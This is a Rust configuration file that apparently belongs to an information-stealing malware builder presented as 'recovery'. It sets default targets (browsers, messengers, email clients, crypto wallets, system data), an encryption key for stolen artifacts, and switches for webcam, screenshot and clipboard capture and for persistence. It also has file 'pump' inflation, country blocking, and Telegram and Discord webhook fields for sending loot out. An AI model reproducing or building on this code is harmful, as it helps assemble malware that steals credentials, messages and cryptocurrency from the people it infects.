use crate::recovery::task::RecoveryCategory;

pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[
    RecoveryCategory::Browsers,
    RecoveryCategory::Messengers,
    RecoveryCategory::EmailClients,
    RecoveryCategory::Wallets,
    RecoveryCategory::System,
    RecoveryCategory::Other
]);
pub static DEFAULT_ARTIFACT_KEY: Option<&str> = Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
pub static DEFAULT_CAPTURE_WEBCAMS: bool = false;
pub static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
pub static DEFAULT_PERSISTENCE: bool = false;
pub static DEFAULT_PUMP_SIZE_MB: u32 = 0;
pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = None;
pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = None;
pub static DEFAULT_CUSTOM_KEYWORDS: Option<&[&str]> = None;
pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = None;
pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = None;
pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = None;
